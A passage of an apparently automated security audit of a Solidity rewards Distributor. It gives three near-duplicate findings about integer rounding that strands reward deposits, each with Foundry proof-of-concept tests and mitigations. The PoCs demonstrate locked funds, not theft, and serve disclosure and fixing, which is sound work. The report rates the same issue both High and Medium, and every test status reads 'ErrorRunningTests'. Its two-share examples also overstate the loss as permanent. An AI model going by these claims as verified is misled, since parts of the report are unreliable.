  - amount0 = (IERC20(token0).balanceOf(address(this)) - accruedLaunchpadFee0) - _reserve0;
  - amount1 = (IERC20(token1).balanceOf(address(this)) - accruedLaunchpadFee1) - _reserve1;
  This prevents counting accrued fees as part of user deposits.

- In burn(): base redemption on balances net of accrued fees to prevent LPs from withdrawing the pending fee pot prior to distribution:
  - use balance0NoFees = IERC20(token0).balanceOf(address(this)) - accruedLaunchpadFee0;
  - use balance1NoFees = IERC20(token1).balanceOf(address(this)) - accruedLaunchpadFee1;
  - amount{i} = liquidity * balance{i}NoFees / totalSupply.

- Alternatively (or additionally), gate mint() and burn() when accruedLaunchpadFee* > 0:
  - Before allowing mint/burn, force a cross-timestamp _update (timeElapsed > 0) that distributes any accrued fees; or
  - Require accruedLaunchpadFee0 == 0 && accruedLaunchpadFee1 == 0 for mint/burn.

These changes ensure pending launchpad fees are never double-counted into LP share accounting and cannot be siphoned by timing mint/burn in the same timestamp.





 **Derived From** : Rounding in RewardsTracker permanently locks a portion of deposited rewards

## [M-14]. Rounding in RewardsTracker plus totalPendingRewards can permanently lock deposited rewards

### Finding Severity Justification: Deposited rewards can become permanently locked due to rounding dust being discarded in RewardsTrackerLib.update() while totalPendingRewards is incremented by the full deposit. Users cannot ever claim the rounded-away portion, and the owner cannot skim it because skimExcessRewards is gated by totalPendingRewards. This represents matured yield loss (not just cosmetic dust) that can accumulate over time, but does not enable theft; hence Medium.
## Derived From Pattern/Invariant
Rounding in RewardsTracker permanently locks a portion of deposited rewards

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.addRewards / claimRewards / skimExcessRewards

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
RewardsTrackerLib uses fixed-point accRewardPerShare accounting with a PRECISION_FACTOR of 1e12, but both its per-share and per-user calculations floor on integer division. Combined with Distributor.totalPendingRewards, this creates cases where non-trivial reward amounts are forever locked: counted as pending, but unclaimable by users and unskimmable by the owner.

Key logic:
- On reward addition, Distributor does:
```solidity
rs.addBaseRewards(launchAsset, launchAssetAmount);
_increaseTotalPending(launchAsset, launchAssetAmount);
launchAsset.safeTransferFrom(msg.sender, address(this), uint256(launchAssetAmount));
```
so totalPendingRewards[asset] is incremented by the full deposit amount.

- RewardsTrackerLib.update folds pending rewards into the per-share accumulator using integer division:
```solidity
if (self.pendingBaseRewards > 0) {
    self.accBaseRewardPerShare = newAccBaseRewardsPerShare;
    delete self.pendingBaseRewards;
}

function getAccRewardsPerShare(RewardPoolData storage self)
    internal view
    returns (uint256 accBaseRewardsPerShare, uint256 accQuoteRewardsPerShare)
{
    uint96 totalShares = self.totalShares;
    if (totalShares == 0) return (self.accBaseRewardPerShare, self.accQuoteRewardPerShare);

    accBaseRewardsPerShare = self.accBaseRewardPerShare;
    if (self.pendingBaseRewards > 0) {
        accBaseRewardsPerShare += ((self.pendingBaseRewards * PRECISION_FACTOR) / uint128(totalShares));
    }
}

function totalAccRewards(uint256 shares, uint256 accRewardsPerShare) internal pure returns (uint256) {
    return (shares * accRewardsPerShare) / PRECISION_FACTOR; // floors
}
```
- After update(), pendingBaseRewards is deleted without tracking the remainder from `(pendingBaseRewards * PRECISION_FACTOR) / totalShares`.
- User rewards are computed as `totalAccRewards(shares, accPerShare) - rewardDebt`, again floor-dividing by PRECISION_FACTOR.

Example with two equal stakers:
- totalShares = 2, user1.shares = user2.shares = 1.
- A small deposit of 1 token is added via addRewards; totalPendingRewards[asset] increases by 1, and the contract balance increases by 1.
- On the first claim, update() sets:
  - accBaseRewardPerShare += (1 * 1e12) / 2 = 500e9.
  - pendingBaseRewards is set to 0.
- For a user with 1 share:
  - totalAccRewards = (1 * 500e9) / 1e12 = 0 (floored).
  - baseAmount = 0 - baseRewardDebt = 0; they receive nothing.
- The same holds for all users; nobody can ever claim that 1 token.
- Because baseAmount is zero, _distributeAssets does not call _decreaseTotalPending and totalPendingRewards[asset] remains 1 while the contract still holds 1 token.
- skimExcessRewards checks:
```solidity
if (amount > asset.balanceOf(address(this)) - totalPendingRewards[asset]) revert SkimOverflow();
```
Here, `balanceOf == totalPendingRewards == 1`, so `balanceOf - totalPendingRewards == 0`, and any attempt to skim the 1 token reverts.

This is not limited to single-token examples; whenever the deposit size and share distribution cause the fixed-point math to round all users' rewards down to zero (or to a sum strictly less than the deposit), the undistributed portion of the deposit remains permanently locked:
- It is counted in totalPendingRewards.
- No user can claim it (because accRewardPerShare increments are too small relative to PRECISION_FACTOR and share counts).
- The owner cannot recover it as "excess" because skimExcessRewards is protected by totalPendingRewards.

Over many reward additions, especially with small per-update deposits and large totalShares, this rounding dust can accumulate to non-negligible amounts.

## Impact
Deposited reward tokens can become unclaimable and unskimmable due to rounding. Specifically: (a) If pending * PRECISION_FACTOR / totalShares == 0 (i.e., per-share increment rounds to zero), update() deletes the entire pending amount without increasing accPerShare. That deposit becomes permanently orphaned from reward accounting: users can never claim it, and the owner cannot skim it because totalPendingRewards still includes the deposit. (b) When per-share increment > 0 but small, the undistributed portion can remain indefinitely locked (until sufficient additional rewards accrue). Over time, orphaned deposits (case a) accumulate into a hard, unrecoverable pool of stranded rewards.

## Command to Run Test


## Proof of Concept
Goal: Show a strictly permanent lock by forcing the per-share increment to 0 so the entire deposit is deleted from accounting while totalPendingRewards is increased and the token is held by the contract.

Steps:
1) Deploy Distributor and two ERC20 tokens (base, quote). Initialize Distributor with a launchpad address and create a rewards pair (base, quote) from that launchpad.
2) From the launchpad, grant two stakers extremely large shares so that totalShares > pending * PRECISION_FACTOR:
   - Let PRECISION_FACTOR = 1e12 (as in RewardsTrackerLib).
   - Give each staker 2e12 shares, so totalShares = 4e12.
3) Another address adds a tiny base reward deposit of 1 token via addRewards(base, quote, 1, 0). This increments totalPendingRewards[base] by 1 and transfers 1 token into the Distributor.
4) On the first claim (or any call that triggers update()), per-share increment is:
   delta = floor(pending * PRECISION_FACTOR / totalShares) = floor(1 * 1e12 / 4e12) = 0.
   update() then deletes pendingBaseRewards without changing accBaseRewardPerShare.
5) Both stakers call claimRewards(base):
   - accBaseRewardPerShare did not change, so totalAccRewards == rewardDebt; they receive 0.
6) The Distributor still holds the 1 token and totalPendingRewards[base] == 1. Because no user can ever claim it (acc did not increase), and skimExcessRewards checks balance - totalPendingRewards, the owner cannot skim it (SkimOverflow).
7) Even if future rewards are added and later fully distributed, the original 1 token remains unaccounted in acc per-share history. totalPendingRewards will continue to account for the aggregate of deposits minus payouts, keeping this early 1 token locked unless the implementation changes.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "../contracts/launchpad/Distributor.sol";
import {RewardPoolDataMemory} from "../contracts/launchpad/libraries/RewardsTracker.sol";

contract MockERC20Rounding {
    string public name = "Mock";
    string public symbol = "MOCK";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
}

contract DistributorPermanentLockTest is Test {
    Distributor distributor;
    MockERC20Rounding base;
    MockERC20Rounding quote;

    address launchpad = address(0xBEEF);
    address staker1 = address(0xAAA1);
    address staker2 = address(0xAAA2);
    address rewarder = address(0x1234);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(launchpad);

        base = new MockERC20Rounding();
        quote = new MockERC20Rounding();

        vm.prank(launchpad);
        distributor.createRewardsPair(address(base), address(quote));

        // Force per-share increment == 0 by making totalShares >> PRECISION_FACTOR
        // PRECISION_FACTOR = 1e12 in RewardsTrackerLib.
        uint96 bigShares = 2_000_000_000_000; // 2e12 each; total = 4e12
        vm.prank(launchpad);
        distributor.increaseStake(address(base), staker1, bigShares);
        vm.prank(launchpad);
        distributor.increaseStake(address(base), staker2, bigShares);

        // Add a tiny reward of 1 token that will be deleted by update() (per-share = 0)
        base.mint(rewarder, 1);
        vm.startPrank(rewarder);
        base.approve(address(distributor), type(uint256).max);
        distributor.addRewards(address(base), address(quote), 1, 0);
        vm.stopPrank();
    }

    function testPermanentLockWhenPerShareIsZero() public {
        // Trigger update() via claims; both users receive 0
        vm.prank(staker1);
        distributor.claimRewards(address(base));
        vm.prank(staker2);
        distributor.claimRewards(address(base));

        // Verify no rewards distributed
        assertEq(base.balanceOf(staker1), 0);
        assertEq(base.balanceOf(staker2), 0);

        // Verify accBaseRewardPerShare did not change (still 0)
        RewardPoolDataMemory memory data = distributor.getRewardsPoolData(address(base));
        assertEq(data.accBaseRewardPerShare, 0);

        // Contract still holds the token and it is counted as pending
        assertEq(base.balanceOf(address(distributor)), 1);
        assertEq(distributor.totalPendingRewards(address(base)), 1);

        // Owner cannot skim since balance == totalPendingRewards
        vm.expectRevert(Distributor.SkimOverflow.selector);
        distributor.skimExcessRewards(address(base), 1);
    }
}


## Suggested Mitigation
Do not delete pending rewards in update(); instead, carry forward the rounding remainder so that every token eventually becomes claimable as more rewards accrue. Concretely, for each of base/quote:
- Compute: scaled = pending * PRECISION_FACTOR; perShare = scaled / totalShares.
- Update: accRewardPerShare += perShare.
- Compute distributed = (perShare * totalShares) / PRECISION_FACTOR; // number of tokens actually allocable
- Set pending = pending - distributed; // carry the dust forward into the next update

This change must replace the current pattern that unconditionally deletes pending when > 0. It ensures that deposits which would otherwise round to perShare == 0 remain in pending until they can be distributed, and it keeps totalPendingRewards aligned with claimable amounts. Apply the same fix for quote rewards.


## [H-15]. Rewards rounding causes part or all of deposited rewards to become permanently unclaimable and unskimmable

### Finding Severity Justification: Remainders from reward distribution are discarded while totalPendingRewards is increased by the full deposit. Because update() deletes pending rewards even when the acc* increment rounds to zero, some or all of each deposit can become permanently unclaimable. The stuck tokens also cannot be skimmed due to the balance - totalPendingRewards guard, causing irreversible asset lock. With frequent small deposits (e.g., AMM fees) this can accumulate to significant amounts, directly reducing user yield and stranding funds.
## Derived From Pattern/Invariant
Rounding in RewardsTracker permanently locks a portion of deposited rewards

## Exploit Type
RoundingError

## Location
Distributor.addRewards / claimRewards / increaseStake / decreaseStake

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The rewards system uses a fixed-point `accRewardPerShare` pattern with integer division and `PRECISION_FACTOR = 1e12`. Remainders from the per-share calculation are discarded and never re-credited, while the Distributor's global `totalPendingRewards` mapping assumes the full deposit amount is payable to users.

Core math in `RewardsTrackerLib`:

```solidity
uint128 public constant PRECISION_FACTOR = 1e12;

function totalAccRewards(uint256 shares, uint256 accRewardsPerShare) internal pure returns (uint256) {
    return (shares * accRewardsPerShare) / PRECISION_FACTOR;
}

function getAccRewardsPerShare(RewardPoolData storage self)
    internal
    view
    returns (uint256 accBaseRewardsPerShare, uint256 accQuoteRewardsPerShare)
{
    uint96 totalShares = self.totalShares;
    if (totalShares == 0) return (self.accBaseRewardPerShare, self.accQuoteRewardPerShare);

    accBaseRewardsPerShare = self.accBaseRewardPerShare;
    accQuoteRewardsPerShare = self.accQuoteRewardPerShare;

    if (self.pendingBaseRewards > 0) {
        accBaseRewardsPerShare += ((self.pendingBaseRewards * PRECISION_FACTOR) / uint128(totalShares));
    }

    if (self.pendingQuoteRewards > 0) {
        accQuoteRewardsPerShare += ((self.pendingQuoteRewards * PRECISION_FACTOR) / uint128(totalShares));
    }
}

function update(RewardPoolData storage self)
    internal
    returns (uint256 newAccBaseRewardsPerShare, uint256 newAccQuoteRewardsPerShare)
{
    (newAccBaseRewardsPerShare, newAccQuoteRewardsPerShare) = getAccRewardsPerShare(self);

    if (self.pendingBaseRewards > 0) {
        self.accBaseRewardPerShare = newAccBaseRewardsPerShare;
        delete self.pendingBaseRewards;
    }

    if (self.pendingQuoteRewards > 0) {
        self.accQuoteRewardPerShare = newAccQuoteRewardsPerShare;
        delete self.pendingQuoteRewards;
    }
}
```

Global accounting in `Distributor.addRewards` and `_decreaseTotalPending`:

```solidity
function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    ...
    if (launchAssetAmount > 0) {
        rs.addBaseRewards(launchAsset, launchAssetAmount);
        _increaseTotalPending(launchAsset, launchAssetAmount);
        launchAsset.safeTransferFrom(msg.sender, address(this), uint256(launchAssetAmount));
    }

    if (quoteAssetAmount > 0) {
        rs.addQuoteRewards(launchAsset, quoteAsset, quoteAssetAmount);
        _increaseTotalPending(quoteAsset, quoteAssetAmount);
        quoteAsset.safeTransferFrom(msg.sender, address(this), uint256(quoteAssetAmount));
    }
}

function _increaseTotalPending(address asset, uint256 amount) internal {
    unchecked {
        totalPendingRewards[asset] += amount;
    }
}

function _decreaseTotalPending(address asset, uint256 amount) internal {
    uint256 currTotal = totalPendingRewards[asset];
    if (currTotal < amount) revert ClaimAmountExceedsTotalPendingRewards();
    unchecked {
        totalPendingRewards[asset] -= amount;
    }
}
```

`totalPendingRewards[asset]` is incremented by the full nominal deposit, but only decremented by **actually paid out** `baseAmount`/`quoteAmount`, which derive from `totalAccRewards(shares, accRewardsPerShare)` and are floored twice (once in `getAccRewardsPerShare`, once in `totalAccRewards`). Any remainder from `(pendingRewards * PRECISION_FACTOR) / totalShares` is effectively lost.

In extreme cases (e.g., small deposits relative to `totalShares`), the entire deposit can vanish from the users' perspective:

* Example with 2 users holding 1 share each (`totalShares = 2`) and a base reward deposit of 1 unit:
  * `pendingBaseRewards = 1`.
  * `deltaAcc = (1 * 1e12) / 2 = 500,000,000,000`.
  * New `accBaseRewardPerShare = 500e9`.
  * For each user: `rewards = 1 * 500e9 / 1e12 = 0` (floored).
  * `pendingBaseRewards` is deleted in `update()`, so no further accrual from this deposit.
  * The full 1 unit has been added to `totalPendingRewards[baseAsset]` and the contract's token balance increased, but **no user can ever claim it**.

Because `skimExcessRewards` only allows withdrawing `balanceOf(asset) - totalPendingRewards[asset]`, these locked tokens are also **not withdrawable by the owner**:

```solidity
function skimExcessRewards(address asset, uint256 amount) external onlyOwnerOrRoles(ADMIN_ROLE) {
    if (amount > asset.balanceOf(address(this)) - totalPendingRewards[asset]) revert SkimOverflow();
    asset.safeTransfer(msg.sender, amount);
}
```

Over many deposits (e.g., small per-swap AMM fees repeatedly forwarded via `addRewards`), this rounding dust can systematically accumulate:

* Every reward deposit is counted in `totalPendingRewards`.
* Only the floor of the per-share distribution is actually claimable.
* The sum of all users' lifetime payouts is strictly less than the total deposited amount by the sum of all rounding remainders.
* The difference sits idle in the Distributor, always counted as `pending`, so neither users nor the admin can ever access it.

This breaks the intended invariant that every token deposited as rewards is either claimable by stakers or reclaimable by governance.

## Impact
When a rewards deposit is too small relative to totalShares, i.e., pending * PRECISION_FACTOR < totalShares, getAccRewardsPerShare() returns a zero increment and update() still deletes pending*Rewards. This causes the entire deposit to be permanently excluded from acc*RewardPerShare and therefore forever unclaimable by any user. Meanwhile, totalPendingRewards is increased by the full deposit and only decreased upon actual user payouts, so these tokens also cannot be skimmed (balance - totalPendingRewards remains zero). This results in hard, unrecoverable token lock. Even when the acc increment is non-zero, per-user double-flooring can temporarily suppress payouts; if this occurs at the end of rewards, those tokens can remain stuck as well, compounding the loss.

## Command to Run Test


## Proof of Concept
Goal: Show a deposit that is fully and permanently lost because the per-share increment rounds to zero while update() deletes pending.

Steps:
1) Deploy Distributor and set launchpad = address(this). Create a rewards pair (launchAsset, quoteAsset).
2) Give Alice and Bob very large shares so that totalShares > PRECISION_FACTOR (1e12). For example: Alice = 1e12 shares, Bob = 1e12 shares, so totalShares = 2e12.
3) Deposit a tiny base reward of exactly 1 unit into the pool via addRewards.
4) Have Alice call claimRewards(launchAsset). Inside update():
   - deltaAcc = floor(1 * 1e12 / 2e12) = 0
   - accBaseRewardPerShare remains unchanged; pendingBaseRewards is deleted.
   - Alice’s pending = 0, Bob’s pending = 0 (and will remain 0 forever for this deposit).
5) State after claim:
   - distributor.totalPendingRewards(launchAsset) == 1
   - launchAsset.balanceOf(address(distributor)) == 1
   - getPendingRewards for both users == 0
6) Attempt skimExcessRewards(launchAsset, 1) as the owner; it reverts because balance - totalPendingRewards == 0.

Result: The 1 token deposit is permanently unclaimable and unskimmable due to update() wiping pending when the acc increment is zero.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "../contracts/launchpad/Distributor.sol";

contract MockERC20R {
    string public name = "Mock";
    string public symbol = "MOCK";
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "ALLOWANCE");
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "BAL");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
}

contract DistributorPermanentRoundingLossTest is Test {
    Distributor distributor;
    MockERC20R launchAsset;
    MockERC20R quoteAsset;

    address launchpad = address(this);
    address alice = address(0xA11CE);
    address bob = address(0xB0B);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(launchpad);

        launchAsset = new MockERC20R();
        quoteAsset = new MockERC20R();

        // Set up the rewards pair via launchpad
        distributor.createRewardsPair(address(launchAsset), address(quoteAsset));

        // Make totalShares > PRECISION_FACTOR so deltaAcc rounds to zero for a deposit of 1
        // PRECISION_FACTOR = 1e12. We set totalShares = 2e12 (split evenly).
        uint96 halfShares = 1_000_000_000_000; // 1e12
        distributor.increaseStake(address(launchAsset), alice, halfShares);
        distributor.increaseStake(address(launchAsset), bob, halfShares);
    }

    function testDepositRoundingToZeroIsLostAndUnskimmable() public {
        // Deposit 1 unit of base rewards
        uint256 reward = 1;
        launchAsset.mint(address(this), reward);
        launchAsset.approve(address(distributor), reward);
        distributor.addRewards(address(launchAsset), address(quoteAsset), uint128(reward), 0);

        // Alice claims; acc increment rounds to zero, pending is deleted, payout is 0
        vm.startPrank(alice);
        (uint256 basePaid, uint256 quotePaid) = distributor.claimRewards(address(launchAsset));
        vm.stopPrank();
        assertEq(basePaid, 0);
        assertEq(quotePaid, 0);

        // The 1 token remains accounted in totalPendingRewards and held by the contract
        assertEq(distributor.totalPendingRewards(address(launchAsset)), reward);
        assertEq(launchAsset.balanceOf(address(distributor)), reward);

        // Owner cannot skim it as excess because balance - totalPendingRewards == 0
        vm.expectRevert(Distributor.SkimOverflow.selector);
        distributor.skimExcessRewards(address(launchAsset), reward);
    }
}

## Suggested Mitigation
Do not delete the entire pending*Rewards on update. Instead, only subtract the portion that was actually accounted for in acc*RewardPerShare and carry forward the remainder for future updates. A safe pattern:

- Compute accDelta = (pending * PRECISION_FACTOR) / totalShares.
- If accDelta == 0, do nothing (leave pending as-is so it can accumulate until distributable).
- Else, set acc*RewardPerShare += accDelta and reduce pending by the exact amount actually accounted:
  accounted = (accDelta * totalShares) / PRECISION_FACTOR; // This is <= pending due to flooring
  pending -= accounted; // leave remainder in pending for future rounds

This ensures no deposit is ever lost to rounding and all tokens are eventually claimable. As an operational safety net, you may also add an admin-only reconcile function (with strict checks) to reduce totalPendingRewards to min(totalPendingRewards, token.balanceOf(this) - provablyUnowedDust) once the rewards program is ended, but the primary fix above should make such reconciliation unnecessary in normal operation.


## [M-16]. Rounding in RewardsTracker and Distributor permanently locks part of reward deposits and makes them unclaimable

### Finding Severity Justification: Rewards rounding can permanently lock real reward tokens in the Distributor. When (pendingRewards * PRECISION_FACTOR) / totalShares == 0, update() deletes pending rewards without changing acc*PerShare, making that entire deposit unclaimable forever. Because totalPendingRewards is still incremented by the full deposit and only decremented on actual payouts, the owner cannot skim the stuck tokens due to the skim guard. This can repeatedly happen for small fee accruals relative to large totalShares, causing meaningful cumulative loss of matured rewards to stakers and irrecoverable tokens in the contract. Impact is loss of rewards (assets) but not users’ principal; hence Medium.
## Derived From Pattern/Invariant
Rounding in RewardsTracker permanently locks a portion of deposited rewards

## Exploit Type
AccountingInvariantViolation

## Location
RewardsTrackerLib.update

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
RewardsTrackerLib uses a standard accRewardPerShare pattern with PRECISION_FACTOR = 1e12, but integer-division rounding combined with Distributor.totalPendingRewards accounting causes some deposited rewards to become permanently unclaimable and also unskimmable.

Key code:

- New rewards are accumulated as pendingBaseRewards / pendingQuoteRewards and then folded into per-share indices using integer division:

    if (self.pendingBaseRewards > 0) {
        accBaseRewardsPerShare += (self.pendingBaseRewards * PRECISION_FACTOR) / uint128(totalShares);
    }

- update() then applies these indices and *deletes* pendingBaseRewards / pendingQuoteRewards without tracking any remainder:

    if (self.pendingBaseRewards > 0) {
        self.accBaseRewardPerShare = newAccBaseRewardsPerShare;
        delete self.pendingBaseRewards;
    }

- User rewards are computed by:

    function totalAccRewards(uint256 shares, uint256 accRewardsPerShare) internal pure returns (uint256) {
        return (shares * accRewardsPerShare) / PRECISION_FACTOR; // floors
    }

- At the Distributor level, addRewards() blindly increments totalPendingRewards[asset] by the full deposit amount:

    rs.addBaseRewards(launchAsset, launchAssetAmount);
    _increaseTotalPending(launchAsset, launchAssetAmount);
    launchAsset.safeTransferFrom(msg.sender, address(this), launchAssetAmount);

- When rewards are paid (stake/unstake/claim), _distributeAssets() only subtracts the actually paid amounts from totalPendingRewards:

    if (baseAmount > 0) {
        _decreaseTotalPending(base, baseAmount);
        base.safeTransfer(msg.sender, baseAmount);
    }

There are two important rounding-loss modes:

1) **Per-share delta rounds down to zero**: if pendingRewards * PRECISION_FACTOR < totalShares, then (pendingRewards * PRECISION_FACTOR) / totalShares == 0. update() will set pendingRewards back to zero without changing acc*RewardPerShare. No user ever sees any increase in rewards, but totalPendingRewards[asset] and the contract's token balance still increased by the full deposit amount. Those tokens are now permanently unclaimable.

Example: totalShares = 1e18, PRECISION_FACTOR = 1e12. Any deposit pendingRewards < 1e6 tokens will satisfy pendingRewards * PRECISION_FACTOR < totalShares, so the entire deposit is lost to rounding.

2) **General truncation in totalAccRewards**: even when per-share delta > 0, users' individual rewards are floored, so the sum over all users is strictly less than the total deposited amount whenever (pendingRewards * PRECISION_FACTOR) is not an exact multiple of totalShares. The difference is never re-credited anywhere because pendingBaseRewards/pendingQuoteRewards are fully cleared in update(), and totalPendingRewards is only decremented by the paid-out baseAmount/quoteAmount.

In both cases, the locked "dust" remains counted as part of totalPendingRewards[asset] and as actual token balance. skimExcessRewards() prevents the owner from recovering it:

    if (amount > asset.balanceOf(address(this)) - totalPendingRewards[asset]) revert SkimOverflow();

Since balanceOf == totalPendingRewards for this dust, balanceOf - totalPendingRewards == 0 and no amount > 0 can ever be skimmed. Over time, especially for pools with large totalShares where deposits under totalShares / PRECISION_FACTOR are entirely lost, this can accumulate into a non-trivial permanently locked balance.

## Impact
Due to integer division in RewardsTrackerLib, part of a reward deposit can become permanently unclaimable by users and also unskimmable by the owner. Two cases occur: (a) if (pendingRewards * PRECISION_FACTOR) / totalShares == 0, update() clears pending without changing acc*PerShare and the entire deposit is wiped from distribution; (b) even when delta > 0, per-user flooring causes the sum of all user payouts to be strictly less than the distributed amount. In both cases, Distributor.totalPendingRewards is incremented by the full deposit and only reduced by actual payouts, so the residual sits in totalPendingRewards and cannot be skimmed. Note: the “entire-deposit loss” in (a) happens when the deposit is below totalShares / PRECISION_FACTOR in the smallest units of the token, which can still occur frequently for small fee accruals and accumulates over time into a non-trivial stranded balance.

## Command to Run Test


## Proof of Concept
Repro 1: full deposit lost via per-user flooring (2 shares, 1 base unit deposit)
- Setup: totalShares = 2; PRECISION_FACTOR = 1e12. Two users, Alice and Bob, each hold 1 share. A deposit of 1 base unit is added via addRewards().
- On the next state change, update() computes delta = (1 * 1e12) / 2 = 5e11 and sets accBaseRewardPerShare += 5e11; pendingBaseRewards is cleared.
- Alice claims: totalAccBaseRewards = floor(1 * 5e11 / 1e12) = 0 → receives 0.
- Bob claims: same result → receives 0.
- Distributor still holds the 1 unit and totalPendingRewards[base] is still increased by 1 (was never decreased because no payout occurred). The owner cannot skim because balanceOf - totalPendingRewards == 0.
- The 1 deposited unit is now permanently locked and unskimmable.

Repro 2: zero per-share delta wipes pending (small deposits relative to large totalShares)
- Setup: totalShares = 1e18; PRECISION_FACTOR = 1e12.
- Add a small deposit, e.g., 500,000 base units. Compute scaled = 5e5 * 1e12 = 5e17; since scaled < totalShares, delta = 0.
- update(): accBaseRewardPerShare remains unchanged; pendingBaseRewards is deleted.
- No user’s accrued rewards increase, but totalPendingRewards[base] was incremented by 500,000 at deposit time and the contract holds those units. They are now permanently unclaimable and also unskimmable due to the skim guard.

Notes
- The threshold for zero-delta is measured in smallest token units: deposits smaller than totalShares / PRECISION_FACTOR units get wiped in a single update, even though the contract’s balance and totalPendingRewards increase.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "../contracts/launchpad/Distributor.sol";
import "../contracts/launchpad/libraries/RewardsTracker.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            require(allowed >= amount, "allowance");
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

contract RoundingLocksRewardsTest is Test {
    Distributor distributor;
    MockERC20 launch;
    MockERC20 quote;
    address alice = address(0xA11CE);
    address bob = address(0xB0B);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(address(this)); // test is launchpad

        launch = new MockERC20("LAUNCH", "L");
        quote = new MockERC20("QUOTE", "Q");

        distributor.createRewardsPair(address(launch), address(quote));

        // Two users, 1 share each => totalShares = 2
        distributor.increaseStake(address(launch), alice, 1);
        distributor.increaseStake(address(launch), bob, 1);

        // Fund 1 unit of base rewards
        launch.mint(address(this), 1);
        launch.approve(address(distributor), type(uint256).max);
        distributor.addRewards(address(launch), address(quote), 1, 0);
    }

    function testRoundingLocksBaseReward() public {
        // Alice claims, but due to rounding she receives nothing
        vm.prank(alice);
        distributor.claimRewards(address(launch));

        // Bob also claims and receives nothing
        vm.prank(bob);
        distributor.claimRewards(address(launch));

        // Distributor still holds the full 1 token as pending
        assertEq(launch.balanceOf(address(distributor)), 1);
        assertEq(distributor.totalPendingRewards(address(launch)), 1);

        // Owner cannot skim this 1 token because it is counted as pending
        vm.expectRevert(Distributor.SkimOverflow.selector);
        distributor.skimExcessRewards(address(launch), 1);
    }
}

## Suggested Mitigation
Make rewards distribution remainder-aware and align accounting with distributable amounts to prevent permanent lock:

1) Carry remainders forward in RewardsTrackerLib.update
- Compute:
  scaled = uint256(pending) * PRECISION_FACTOR
  delta = scaled / totalShares
  distributed = (delta * totalShares) / PRECISION_FACTOR  // in token units
- Apply:
  accRewardPerShare += delta
  pendingRewards = uint128(uint256(pending) - distributed)  // keep undistributed remainder for future cycles
- This prevents the zero-delta deposit from being silently wiped and ensures small deposits accumulate until they become distributable.

2) Realign Distributor.totalPendingRewards to only the distributable portion
- Today, addRewards() increments totalPendingRewards by the full deposit, which creates unskimmable dust when users’ floorings reduce actual payouts below deposits.
- Instead, after adding to pending (rs.addBaseRewards / rs.addQuoteRewards), immediately call rs.update() once per asset and compute how much was actually scheduled for distribution:
  distributedNow = beforePending + deposit - afterPending
